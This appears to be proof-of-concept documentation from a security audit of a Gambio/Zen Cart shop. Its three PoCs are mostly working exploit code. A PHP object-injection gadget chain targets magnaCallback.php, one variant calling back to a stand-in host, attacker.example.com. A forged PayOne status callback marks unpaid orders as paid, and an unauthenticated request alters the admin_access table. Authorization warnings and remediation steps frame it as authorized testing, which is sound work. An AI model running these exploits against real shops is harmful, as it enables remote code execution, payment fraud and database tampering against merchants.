# PROOF-OF-CONCEPT: CRITICAL VULNERABILITIES
## Security Audit - Gambio/Zen Cart CMS

**WARNING: These POCs are for authorized security testing only.**  
**Use only in controlled environments with explicit permission.**

---

## POC #1: PHP Object Injection → RCE (magnaCallback.php)

### Vulnerability Details
- **File:** `/magnaCallback.php`
- **Lines:** 859, 862
- **Severity:** CRITICAL
- **Impact:** Remote Code Execution

### Prerequisites
1. Obtain valid passphrase from database:
   ```sql
   SELECT value FROM magnalister_config WHERE mkey='general.passphrase' AND mpID=0;
   ```
   OR brute force if weak passphrase used

### POC Script: Basic Test (File Write)

```python
#!/usr/bin/env python3
"""
POC: PHP Object Injection in magnaCallback.php
Tests RCE via Monolog file write gadget chain
"""

import requests
import base64

# Target configuration
TARGET_URL = "http://target.example.com/magnaCallback.php"
PASSPHRASE = "REPLACE_WITH_ACTUAL_PASSPHRASE"

# Gadget chain using Monolog BufferHandler
# This will write a test file to prove RCE
poc_payload = """
O:37:"Monolog\\Handler\\BufferHandler":3:{
  s:10:"*handler";
  O:29:"Monolog\\Handler\\StreamHandler":3:{
    s:6:"*url";
    s:23:"/tmp/poc_rce_proof.txt";
    s:9:"*level";
    i:100;
    s:11:"*bubble";
    b:1;
  }
  s:13:"*bufferSize";
  i:0;
  s:9:"*buffer";
  a:1:{
    i:0;
    a:2:{
      s:7:"message";
      s:50:"RCE Proof: magnaCallback.php Object Injection POC";
      s:5:"level";
      i:100;
    }
  }
}
"""

# Serialize the payload
serialized = poc_payload.replace('\n', '').replace(' ', '')

# Prepare POST data
data = {
    'passphrase': PASSPHRASE,
    'function': 'test',
    'arguments': serialized
}

print("[*] Sending PHP Object Injection POC to magnaCallback.php")
print(f"[*] Target: {TARGET_URL}")
print(f"[*] Passphrase: {PASSPHRASE[:10]}...")

try:
    response = requests.post(TARGET_URL, data=data, timeout=10)
    print(f"[*] Response Status: {response.status_code}")
    print(f"[*] Response Body: {response.text[:200]}")
    
    if response.status_code == 200:
        print("\n[+] Request successful!")
        print("[*] Verification steps:")
        print("    1. Check if file /tmp/poc_rce_proof.txt was created")
        print("    2. Content should be: 'RCE Proof: magnaCallback.php Object Injection POC'")
        print("\n[!] If file exists, RCE is confirmed!")
    else:
        print("\n[-] Request failed or passphrase incorrect")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Error: {e}")
```

### POC Script: Advanced Test (Remote Callback)

```python
#!/usr/bin/env python3
"""
POC: PHP Object Injection - Remote HTTP Callback
Uses Guzzle HTTP to prove outbound network control
"""

import requests

TARGET_URL = "http://target.example.com/magnaCallback.php"
PASSPHRASE = "REPLACE_WITH_ACTUAL_PASSPHRASE"
ATTACKER_CALLBACK = "http://attacker.example.com/callback"

# Guzzle HTTP gadget chain for remote callback
poc_payload = """
O:31:"GuzzleHttp\\Cookie\\CookieJar":1:{
  s:10:"*cookies";
  a:1:{
    i:0;
    O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{
      s:4:"data";
      a:3:{
        s:4:"Name";
        s:3:"poc";
        s:5:"Value";
        s:20:"object_injection_rce";
        s:6:"Domain";
        s:""" + str(len(ATTACKER_CALLBACK)) + """:" """ + ATTACKER_CALLBACK + """";
      }
    }
  }
}
"""

serialized = poc_payload.replace('\n', '').replace(' ', '')

data = {
    'passphrase': PASSPHRASE,
    'function': 'test',
    'arguments': serialized
}

print("[*] Sending Guzzle HTTP callback POC")
print(f"[*] Attacker callback URL: {ATTACKER_CALLBACK}")
print("[*] Listening on attacker server for incoming request...")

response = requests.post(TARGET_URL, data=data, timeout=10)
print(f"[*] Response: {response.status_code}")
print("\n[*] Check attacker server logs for incoming HTTP request")
print("[!] If request received, RCE and outbound network control confirmed")
```

### Verification Steps

1. **File Write Test:**
   ```bash
   # On target server
   ls -la /tmp/poc_rce_proof.txt
   cat /tmp/poc_rce_proof.txt
   ```

2. **HTTP Callback Test:**
   ```bash
   # On attacker server
   nc -lvnp 80
   # OR
   python3 -m http.server 80
   # Watch for incoming connection from target
   ```

3. **Evidence Collection:**
   - File timestamp proves code execution
   - HTTP logs show outbound connection
   - Process list during execution

---

## POC #2: Unauthenticated Payment Callback (payone_txstatus.php)

### Vulnerability Details
- **File:** `/payone_txstatus.php`
- **Lines:** 21-44
- **Severity:** CRITICAL
- **Impact:** Financial fraud, payment bypass

### POC Script: Mark Order as Paid

```python
#!/usr/bin/env python3
"""
POC: Unauthenticated Payment Status Manipulation
Marks unpaid order as paid without actual payment
"""

import requests

TARGET_URL = "http://target.example.com/payone_txstatus.php"

# Target order to mark as paid
TARGET_ORDER_ID = "ORDER-12345"  # Replace with actual order ID

# PayOne transaction status update payload
# This simulates a legitimate payment gateway callback
payload = {
    'txaction': 'appointed',          # Transaction approved
    'txtime': '20251226152400',       # Current timestamp
    'clearingtype': 'cc',             # Credit card
    'txid': '999888777',              # Fake transaction ID
    'reference': TARGET_ORDER_ID,     # Target order
    'userid': '12345',                # User ID
    'customerid': '54321',            # Customer ID
    'amount': '10000',                # Amount in cents (100.00)
    'currency': 'EUR',                # Currency
    'receivable': '0',                # Mark as fully paid
    'balance': '0',                   # No balance remaining
    'sequencenumber': '0',            # Sequence number
    'key': 'fake_key_no_validation'   # No signature validation!
}

print("[*] POC: Unauthenticated Payment Status Manipulation")
print(f"[*] Target: {TARGET_URL}")
print(f"[*] Order ID: {TARGET_ORDER_ID}")
print(f"[*] Attempting to mark order as PAID without actual payment...")

try:
    response = requests.post(
        TARGET_URL,
        data=payload,
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        timeout=10
    )
    
    print(f"\n[*] Response Status: {response.status_code}")
    print(f"[*] Response Body: {response.text}")
    
    if "TSOK" in response.text:
        print("\n[+] SUCCESS! Payment status accepted without authentication!")
        print("\n[!] CRITICAL: Order marked as paid without actual payment")
        print("[!] IMPACT: Direct financial fraud possible")
        print("\n[*] Verification steps:")
        print(f"    1. Check database: SELECT * FROM payone_transactions WHERE reference='{TARGET_ORDER_ID}'")
        print(f"    2. Check order status in admin panel")
        print(f"    3. Verify order shows as PAID")
        print("\n[!] If order is marked paid, financial fraud is confirmed!")
    elif "NACK" in response.text:
        print("\n[-] Request rejected (NACK)")
        print("[*] Check payload format or server configuration")
    else:
        print("\n[?] Unexpected response")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Error: {e}")

print("\n[*] Database verification query:")
print(f"    SELECT orders_id, orders_status, payment_class FROM orders WHERE orders_id='{TARGET_ORDER_ID}';")
```

### Manual Test (curl)

```bash
#!/bin/bash
# Quick manual test with curl

TARGET="http://target.example.com/payone_txstatus.php"
ORDER_ID="ORDER-12345"

curl -X POST "$TARGET" \
  -d "txaction=appointed" \
  -d "txtime=$(date +%Y%m%d%H%M%S)" \
  -d "clearingtype=cc" \
  -d "txid=999888777" \
  -d "reference=$ORDER_ID" \
  -d "userid=12345" \
  -d "customerid=54321" \
  -d "amount=10000" \
  -d "currency=EUR" \
  -d "receivable=0" \
  -d "balance=0" \
  -d "sequencenumber=0" \
  -v

# Check response for "TSOK" = success
# Then verify in database:
# mysql> SELECT * FROM payone_transactions WHERE reference='ORDER-12345';
```

### Verification Steps

1. **Database Check:**
   ```sql
   -- Check transaction was recorded
   SELECT * FROM payone_transactions 
   WHERE reference='ORDER-12345' 
   ORDER BY txtime DESC LIMIT 1;
   
   -- Check order status changed
   SELECT orders_id, orders_status, payment_class 
   FROM orders 
   WHERE orders_id='ORDER-12345';
   ```

2. **Admin Panel Check:**
   - Login to admin panel
   - Navigate to Orders section
   - Find target order
   - Verify status shows as "Paid" or "Completed"

3. **Log Verification:**
   ```bash
   # Check PayOne log file
   grep "ORDER-12345" logfiles/payment-payone-txlog*.log
   ```

---

## POC #3: Unauthorized Database Modification (mailhive.php)

### Vulnerability Details
- **File:** `/mailhive.php`
- **Lines:** 80-91
- **Severity:** HIGH
- **Impact:** Database tampering, privilege escalation

### POC Script: Trigger Database Modification

```python
#!/usr/bin/env python3
"""
POC: Unauthorized Database Schema Modification
Triggers ALTER TABLE without authentication
"""

import requests

TARGET_URL = "http://target.example.com/mailhive.php"

print("[*] POC: Unauthorized Database Modification")
print(f"[*] Target: {TARGET_URL}")
print("[*] This will add 'mailbeez' column to admin_access table")
print("[*] No authentication required!")

try:
    # Simple GET request triggers the vulnerability
    response = requests.get(TARGET_URL, timeout=10)
    
    print(f"\n[*] Response Status: {response.status_code}")
    print(f"[*] Response contains: {response.text[:500]}")
    
    if "done" in response.text.lower() or "updated" in response.text.lower():
        print("\n[+] SUCCESS! Database modification triggered!")
        print("[!] CRITICAL: Database schema altered without authentication")
        print("\n[*] Verification steps:")
        print("    1. DESCRIBE admin_access;")
        print("    2. Check for 'mailbeez' column")
        print("    3. SELECT customers_id, mailbeez FROM admin_access;")
        print("\n[!] If column exists, unauthorized DB modification confirmed!")
    else:
        print("\n[?] Check response for execution status")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Error: {e}")

print("\n[*] Database verification queries:")
print("    DESCRIBE admin_access;")
print("    SELECT * FROM admin_access WHERE mailbeez IS NOT NULL;")
```

### Manual Test (curl)

```bash
#!/bin/bash
# Simple curl test

TARGET="http://target.example.com/mailhive.php"

echo "[*] Triggering unauthorized database modification..."
curl "$TARGET" -v

echo ""
echo "[*] Verify database changes:"
echo "    mysql> DESCRIBE admin_access;"
echo "    mysql> SELECT customers_id, mailbeez FROM admin_access;"
```

### Verification Steps

1. **Before POC:**
   ```sql
   -- Capture initial schema
   DESCRIBE admin_access;
   -- Should NOT have 'mailbeez' column
   ```

2. **Run POC:**
   ```bash
   python3 poc_mailhive.py
   # OR
   curl http://target.example.com/mailhive.php
   ```

3. **After POC:**
   ```sql
   -- Verify schema change
   DESCRIBE admin_access;
   -- Should now have 'mailbeez INT(1)' column
   
   -- Check inserted data
   SELECT customers_id, mailbeez FROM admin_access;
   -- Should show: groups=2, id=1 has mailbeez=1
   ```

---

## EVIDENCE COLLECTION CHECKLIST

### For All POCs:

1. **Network Traffic:**
   ```bash
   # Capture with tcpdump
   tcpdump -i any -w poc_traffic.pcap host target.example.com
   ```

2. **Database State:**
   ```sql
   -- Before test
   mysqldump -u root -p database_name > before_poc.sql
   
   -- After test  
   mysqldump -u root -p database_name > after_poc.sql
   
   -- Compare
   diff before_poc.sql after_poc.sql
   ```

3. **Filesystem Changes:**
   ```bash
   # Monitor file creation
   inotifywait -m /tmp /var/www/html
   
   # Check file timestamps
   find /tmp -type f -newermt "2025-12-26 15:00:00"
   ```

4. **Log Files:**
   ```bash
   # Application logs
   tail -f logfiles/*.log
   
   # Web server logs
   tail -f /var/log/apache2/access.log
   tail -f /var/log/nginx/access.log
   ```

---

## REMEDIATION PRIORITIES

### IMMEDIATE (Within 24 hours):

1. **magnaCallback.php:**
   - Remove or rename file
   - OR add signature validation before unserialize
   - OR whitelist allowed classes with `unserialize($data, ['allowed_classes' => false])`

2. **payone_txstatus.php:**
   - Implement signature verification (HMAC-SHA256)
   - Validate against PayOne portal key
   - Add IP whitelist for PayOne servers

3. **mailhive.php:**
   - Delete file (installation script not needed in production)
   - OR add admin authentication check
   - OR move to protected installer directory

### CRITICAL NOTES:

- **DO NOT** run these POCs against production systems without authorization
- **DO NOT** modify exploit code for malicious purposes  
- **DO** document all testing activities
- **DO** restore systems to original state after testing
- **DO** report findings immediately to system owner

---

**End of Proof-of-Concept Documentation**
